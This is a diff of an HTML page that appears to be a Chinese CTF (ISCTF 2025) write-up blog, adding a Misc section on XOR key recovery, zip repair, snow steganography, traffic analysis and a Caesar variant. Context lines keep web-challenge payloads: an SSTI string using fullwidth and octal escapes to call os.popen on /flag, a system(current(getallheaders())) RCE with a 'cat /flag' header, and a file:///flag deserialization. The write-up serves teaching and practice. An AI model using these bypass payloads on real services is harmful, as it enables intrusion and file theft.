@@ -63,7 +63,7 @@
   />
   <meta property="article:author" content="Winston-Charles-Franklin" />
   <meta property="article:published_time" content="2025-12-09T23:09:00&#43;08:00" />
-  <meta property="article:modified_time" content="2025-12-10T23:20:00&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
+  <meta property="article:modified_time" content="2025-12-11T21:57:00&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
   <meta name="twitter:image" content="/images/zhiyuan2.jpg" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.2f8f58da062c9434e5a40ac958dd369d5f34b0c07c202c515e69c499363cccde.css" />
 <link
@@ -178,6 +178,47 @@
         <li><a href="#ez_fmt">ez_fmt</a></li>
       </ul>
     </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#guess">Guess!</a></li>
+      </ul>
+    </li>
+    <li><a href="#猜数游戏二分10次以内7次一定猜得出来">猜数游戏，二分10次以内（7次）一定猜得出来。</a>
+      <ul>
+        <li><a href="#湖心亭看雪">湖心亭看雪</a></li>
+      </ul>
+    </li>
+    <li><a href="#flagtxt是湖心亭看雪文章的内容似乎还有不可见字符结合题目名猜是snow隐写用解密工具打开密钥依然是15ctf2025">解压密码就是之前得到的’15ctf2025’。
+flag.txt是湖心亭看雪文章的内容，似乎还有不可见字符，结合题目名猜是snow隐写，用解密工具打开，密钥依然是’15ctf2025’。</a>
+      <ul>
+        <li><a href="#消失的flag">消失的flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#应急响应">应急响应</a>
+      <ul>
+        <li><a href="#hacker">hacker</a></li>
+      </ul>
+    </li>
+    <li><a href="#signin">Signin</a>
+      <ul>
+        <li><a href="#老朋友老朋友们和新朋友们">老朋友、老朋友们和新朋友们</a></li>
+      </ul>
+    </li>
+    <li><a href="#关注公众号发送5202ftcsi尽管这里看的很顺眼但还是要倒过来">关注公众号发送5202FTCSI(尽管这里看的很顺眼，但还是要倒过来)。</a>
+      <ul>
+        <li><a href="#what-a-crazy-day-之勇敢者的游戏">What a crazy day!! 之勇敢者的游戏</a></li>
+      </ul>
+    </li>
+    <li><a href="#疯狂星期四彩蛋直接给了">疯狂星期四彩蛋(直接给了)。</a>
+      <ul>
+        <li><a href="#我去flag是真的">我去，Flag是真的！？</a></li>
+      </ul>
+    </li>
+    <li><a href="#给了一些flag选择都是一些之前的错误或违规的提交在这里任选一个都是对的">给了一些flag选择，都是一些之前的错误或违规的提交，在这里，任选一个都是对的。</a>
+      <ul>
+        <li><a href="#ez_caesar">Ez_Caesar</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
 </div></div>
@@ -271,7 +312,7 @@
       >2025-12-09</time
     >
     <time style="display: none;" id="post-update-time"
-      >2025-12-10</time
+      >2025-12-11</time
     >
   </span></div>
 <div class="article-category"></div>
@@ -294,6 +335,7 @@ b@by n0t1ce b0ard
 </span></span><span class="line"><span class="cl">    <span class="nx">phpinfo</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>访问后在phpinfo的Environment里得到flag。</p>
+<hr>
 <h3 id="难过的bottle">
 <a class="header-anchor" href="#%e9%9a%be%e8%bf%87%e7%9a%84bottle"></a>
 难过的bottle
@@ -314,7 +356,8 @@ b@by n0t1ce b0ard
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;无法读取文件内容（可能是二进制文件）&#34;</span>
 </span></span></code></pre></div><p>这里中括号里也用半角会提示渲染错误，所以改用八进制编码，在中括号里可以正常用，文件就是没有过滤的/flag.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s2">&#34;{{ &#39;&#39;.__ｃｌａｓｓ__.__ｍｒｏ__[1].__ｓｕｂｃｌａｓｓｅｓ__()[155].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__[&#39;__</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">165</span><span class="se">\\</span><span class="s2">151</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">151</span><span class="se">\\</span><span class="s2">156</span><span class="se">\\</span><span class="s2">163__&#39;][&#39;</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">156&#39;](&#39;/flag&#39;).ｒｅａｄ()}}&#34;</span>
-</span></span></code></pre></div><h3 id="flag到底在哪">
+</span></span></code></pre></div><hr>
+<h3 id="flag到底在哪">
 <a class="header-anchor" href="#flag%e5%88%b0%e5%ba%95%e5%9c%a8%e5%93%aa"></a>
 Flag到底在哪
 </h3><p>打开靶机是403页面，试着访问robots.txt，有隐藏页面/admin/login.php。</p>
@@ -338,8 +381,9 @@ ezrce
 </span></span><span class="line"><span class="cl"><span class="p">}</span> 
 </span></span></code></pre></div><p>这题是用白名单过滤（差点看成黑名单像rceme那种的了），有白名单之外的字符不能通过，$也不能有，表达式里的是表示必须以前面的模式结尾的，也就是说没法直接通过变量名和字符串传参数，这里我们可以直接调用system()考虑调用函数获取参数，可以通过getallheaders()获取请求头中的值直接作为其他函数的参数，用current(),next(),end()等获得某个值。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?code=system(current(getallheaders()));
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Priority:cat /flag
-</span></span></code></pre></div><h3 id="来签个到吧">
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Priority:cat /flag
+</span></span></span></code></pre></div><hr>
+<h3 id="来签个到吧">
 <a class="header-anchor" href="#%e6%9d%a5%e7%ad%be%e4%b8%aa%e5%88%b0%e5%90%a7"></a>
 来签个到吧
 </h3><p>源码中主要看index.php,api.php和classes.php.</p>
@@ -423,7 +467,8 @@ ezrce
 </span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="s2">&#34;file:///flag&#34;</span><span class="p">;</span>  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
-</span></span></code></pre></div><h3 id="flag我就借走了">
+</span></span></code></pre></div><hr>
+<h3 id="flag我就借走了">
 <a class="header-anchor" href="#flag%e6%88%91%e5%b0%b1%e5%80%9f%e8%b5%b0%e4%ba%86"></a>
 flag?我就借走了
 </h3><p>访问靶机是一个上传文件的网站，用的flask，还带tar文件解压，尝试过像之前一样ssti，似乎不可行，
@@ -473,7 +518,8 @@ ez_RSA
 </span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">base1</span> <span class="o">*</span> <span class="n">base2</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
 </span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-</span></span></code></pre></div><h3 id="power-tower">
+</span></span></code></pre></div><hr>
+<h3 id="power-tower">
 <a class="header-anchor" href="#power-tower"></a>
 Power tower
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;ISCTF{****************}&#39;</span>
@@ -503,7 +549,8 @@ Power tower
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
-</span></span></code></pre></div><h3 id="小蓝鲨的lfsr系统">
+</span></span></code></pre></div><hr>
+<h3 id="小蓝鲨的lfsr系统">
 <a class="header-anchor" href="#%e5%b0%8f%e8%93%9d%e9%b2%a8%e7%9a%84lfsr%e7%b3%bb%e7%bb%9f"></a>
 小蓝鲨的LFSR系统
 </h3><p>题目initState,outputState和ciphertext是已知的，可以构造方程求出mask,这里用矩阵，然后求key和keystream可以直接搬过来把plaintext换成ciphertext_bytes(因为加密前后长度相等，且是异或)。</p>
@@ -566,7 +613,8 @@ Pwn
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="n">paload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></div><h3 id="ez_fmt">
+</span></span></code></pre></div><hr>
+<h3 id="ez_fmt">
 <a class="header-anchor" href="#ez_fmt"></a>
 ez_fmt
 </h3><p>开了canary，输入太长会触发，用先多个%p寻找canary（rbp-8），结果中看到第23个地址以00结尾，可能就是。根据偏移可以确定main的地址，从而计算出实际地址，然后用实际地址覆盖canary,跳转到win()函数，获得shell,要加一个ret调整栈对齐。</p>
@@ -608,6 +656,128 @@ ez_fmt
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div><hr>
 <p><!-- raw HTML omitted -->2025-12-10<!-- raw HTML omitted --></p>
+<h2 id="misc">
+<a class="header-anchor" href="#misc"></a>
+Misc
+</h2><h3 id="guess">
+<a class="header-anchor" href="#guess"></a>
+Guess!
+</h3><h2 id="猜数游戏二分10次以内7次一定猜得出来">
+<a class="header-anchor" href="#%e7%8c%9c%e6%95%b0%e6%b8%b8%e6%88%8f%e4%ba%8c%e5%88%8610%e6%ac%a1%e4%bb%a5%e5%86%857%e6%ac%a1%e4%b8%80%e5%ae%9a%e7%8c%9c%e5%be%97%e5%87%ba%e6%9d%a5"></a>
+猜数游戏，二分10次以内（7次）一定猜得出来。
+</h2><h3 id="湖心亭看雪">
+<a class="header-anchor" href="#%e6%b9%96%e5%bf%83%e4%ba%ad%e7%9c%8b%e9%9b%aa"></a>
+湖心亭看雪
+</h3><p>解出test.py里的a.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;*********&#39;</span> <span class="c1">#这个东西你以后要用到</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;blueshark&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#c = 53591611155a51405e</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;53591611155a51405e&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">c_bytes</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;blueshark&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">c_bytes</span><span class="p">,</span> <span class="n">b</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b&#39;SY\x16\x11\x15ZQ@^&#39;
+</span></span><span class="line"><span class="cl">b&#39;15ctf2025&#39;
+</span></span></code></pre></div><p>拉到最后有zip的特征，尝试直接改.zip不行，搜索FFD9,发现其后跟的就是03041400……也就是说要在这里补文件头，在FFD9之后插入0000504B保存，再改成.zip(用winrar打开).</p>
+<h2 id="flagtxt是湖心亭看雪文章的内容似乎还有不可见字符结合题目名猜是snow隐写用解密工具打开密钥依然是15ctf2025">
+<a class="header-anchor" href="#flagtxt%e6%98%af%e6%b9%96%e5%bf%83%e4%ba%ad%e7%9c%8b%e9%9b%aa%e6%96%87%e7%ab%a0%e7%9a%84%e5%86%85%e5%ae%b9%e4%bc%bc%e4%b9%8e%e8%bf%98%e6%9c%89%e4%b8%8d%e5%8f%af%e8%a7%81%e5%ad%97%e7%ac%a6%e7%bb%93%e5%90%88%e9%a2%98%e7%9b%ae%e5%90%8d%e7%8c%9c%e6%98%afsnow%e9%9a%90%e5%86%99%e7%94%a8%e8%a7%a3%e5%af%86%e5%b7%a5%e5%85%b7%e6%89%93%e5%bc%80%e5%af%86%e9%92%a5%e4%be%9d%e7%84%b6%e6%98%af15ctf2025"></a>
+解压密码就是之前得到的’15ctf2025’。
+flag.txt是湖心亭看雪文章的内容，似乎还有不可见字符，结合题目名猜是snow隐写，用解密工具打开，密钥依然是’15ctf2025’。
+</h2><h3 id="消失的flag">
+<a class="header-anchor" href="#%e6%b6%88%e5%a4%b1%e7%9a%84flag"></a>
+消失的flag
+</h3><p>nc之后输出SSH-2.0-OpenSSH_8.6，用ssh连接。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh qyy@challenge.bluesharkinfo.com -p <span class="m">25257</span>
+</span></span></code></pre></div><p>没有flag,可能有不可见字符，用od -c查看。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh qyy@challenge.bluesharkinfo.com -p <span class="m">25257</span> <span class="p">|</span> od -c
+</span></span></code></pre></div><p>去掉无用的字符即可拼凑出flag。</p>
+<h2 id="应急响应">
+<a class="header-anchor" href="#%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94"></a>
+应急响应
+</h2><h3 id="hacker">
+<a class="header-anchor" href="#hacker"></a>
+hacker
+</h3><p>附件用wireshark打开，过滤出http流量，拉到下面会发现一堆POST请求访问register.php的流量，其源ip：192.168.37.177就是要找的。</p>
+<h2 id="signin">
+<a class="header-anchor" href="#signin"></a>
+Signin
+</h2><h3 id="老朋友老朋友们和新朋友们">
+<a class="header-anchor" href="#%e8%80%81%e6%9c%8b%e5%8f%8b%e8%80%81%e6%9c%8b%e5%8f%8b%e4%bb%ac%e5%92%8c%e6%96%b0%e6%9c%8b%e5%8f%8b%e4%bb%ac"></a>
+老朋友、老朋友们和新朋友们
+</h3><h2 id="关注公众号发送5202ftcsi尽管这里看的很顺眼但还是要倒过来">
+<a class="header-anchor" href="#%e5%85%b3%e6%b3%a8%e5%85%ac%e4%bc%97%e5%8f%b7%e5%8f%91%e9%80%815202ftcsi%e5%b0%bd%e7%ae%a1%e8%bf%99%e9%87%8c%e7%9c%8b%e7%9a%84%e5%be%88%e9%a1%ba%e7%9c%bc%e4%bd%86%e8%bf%98%e6%98%af%e8%a6%81%e5%80%92%e8%bf%87%e6%9d%a5"></a>
+关注公众号发送5202FTCSI(尽管这里看的很顺眼，但还是要倒过来)。
+</h2><h3 id="what-a-crazy-day-之勇敢者的游戏">
+<a class="header-anchor" href="#what-a-crazy-day-%e4%b9%8b%e5%8b%87%e6%95%a2%e8%80%85%e7%9a%84%e6%b8%b8%e6%88%8f"></a>
+What a crazy day!! 之勇敢者的游戏
+</h3><h2 id="疯狂星期四彩蛋直接给了">
+<a class="header-anchor" href="#%e7%96%af%e7%8b%82%e6%98%9f%e6%9c%9f%e5%9b%9b%e5%bd%a9%e8%9b%8b%e7%9b%b4%e6%8e%a5%e7%bb%99%e4%ba%86"></a>
+疯狂星期四彩蛋(直接给了)。
+</h2><h3 id="我去flag是真的">
+<a class="header-anchor" href="#%e6%88%91%e5%8e%bbflag%e6%98%af%e7%9c%9f%e7%9a%84"></a>
+我去，Flag是真的！？
+</h3><h2 id="给了一些flag选择都是一些之前的错误或违规的提交在这里任选一个都是对的">
+<a class="header-anchor" href="#%e7%bb%99%e4%ba%86%e4%b8%80%e4%ba%9bflag%e9%80%89%e6%8b%a9%e9%83%bd%e6%98%af%e4%b8%80%e4%ba%9b%e4%b9%8b%e5%89%8d%e7%9a%84%e9%94%99%e8%af%af%e6%88%96%e8%bf%9d%e8%a7%84%e7%9a%84%e6%8f%90%e4%ba%a4%e5%9c%a8%e8%bf%99%e9%87%8c%e4%bb%bb%e9%80%89%e4%b8%80%e4%b8%aa%e9%83%bd%e6%98%af%e5%af%b9%e7%9a%84"></a>
+给了一些flag选择，都是一些之前的错误或违规的提交，在这里，任选一个都是对的。
+</h2><h3 id="ez_caesar">
+<a class="header-anchor" href="#ez_caesar"></a>
+Ez_Caesar
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">variant_caesar_encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shift</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isupper</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="n">base</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="n">base</span> <span class="o">+</span> <span class="n">shift</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">base</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="n">base</span> <span class="o">+</span> <span class="n">shift</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">new_char</span>
+</span></span><span class="line"><span class="cl">            <span class="n">shift</span> <span class="o">+=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">encrypted</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#c=&#39;KXKET{Tubsdx_re_hg_zytc_hxq_vnjma}&#39;</span>
+</span></span></code></pre></div><p>凯撒加密，将原代码中的+shift改成-shift即可。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="s1">&#39;KXKET</span><span class="si">{Tubsdx_re_hg_zytc_hxq_vnjma}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">variant_caesar_decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">alpha_num</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ch</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">alpha_num</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">shift</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">char</span><span class="o">.</span><span class="n">isupper</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="n">base</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="n">base</span> <span class="o">-</span> <span class="n">shift</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">base</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="n">base</span> <span class="o">-</span> <span class="n">shift</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">new_char</span>
+</span></span><span class="line"><span class="cl">            <span class="n">shift</span> <span class="o">+=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">m</span><span class="o">=</span><span class="n">variant_caesar_decrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span></code></pre></div><hr>
+<p><!-- raw HTML omitted -->2025-12-11<!-- raw HTML omitted --></p>
 </div>
     <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
       <a
@@ -656,10 +826,10 @@ ez_fmt
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;4.8k</span
+          >&nbsp;5.5k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;00:12</span>
+        <span class="icon-coffee">&nbsp;00:13</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -706,6 +876,47 @@ ez_fmt
       <ul>
         <li><a href="#来签个到吧-1">来签个到吧</a></li>
         <li><a href="#ez_fmt">ez_fmt</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#guess">Guess!</a></li>
+      </ul>
+    </li>
+    <li><a href="#猜数游戏二分10次以内7次一定猜得出来">猜数游戏，二分10次以内（7次）一定猜得出来。</a>
+      <ul>
+        <li><a href="#湖心亭看雪">湖心亭看雪</a></li>
+      </ul>
+    </li>
+    <li><a href="#flagtxt是湖心亭看雪文章的内容似乎还有不可见字符结合题目名猜是snow隐写用解密工具打开密钥依然是15ctf2025">解压密码就是之前得到的’15ctf2025’。
+flag.txt是湖心亭看雪文章的内容，似乎还有不可见字符，结合题目名猜是snow隐写，用解密工具打开，密钥依然是’15ctf2025’。</a>
+      <ul>
+        <li><a href="#消失的flag">消失的flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#应急响应">应急响应</a>
+      <ul>
+        <li><a href="#hacker">hacker</a></li>
+      </ul>
+    </li>
+    <li><a href="#signin">Signin</a>
+      <ul>
+        <li><a href="#老朋友老朋友们和新朋友们">老朋友、老朋友们和新朋友们</a></li>
+      </ul>
+    </li>
+    <li><a href="#关注公众号发送5202ftcsi尽管这里看的很顺眼但还是要倒过来">关注公众号发送5202FTCSI(尽管这里看的很顺眼，但还是要倒过来)。</a>
+      <ul>
+        <li><a href="#what-a-crazy-day-之勇敢者的游戏">What a crazy day!! 之勇敢者的游戏</a></li>
+      </ul>
+    </li>
+    <li><a href="#疯狂星期四彩蛋直接给了">疯狂星期四彩蛋(直接给了)。</a>
+      <ul>
+        <li><a href="#我去flag是真的">我去，Flag是真的！？</a></li>
+      </ul>
+    </li>
+    <li><a href="#给了一些flag选择都是一些之前的错误或违规的提交在这里任选一个都是对的">给了一些flag选择，都是一些之前的错误或违规的提交，在这里，任选一个都是对的。</a>
+      <ul>
+        <li><a href="#ez_caesar">Ez_Caesar</a></li>
       </ul>
     </li>
   </ul>
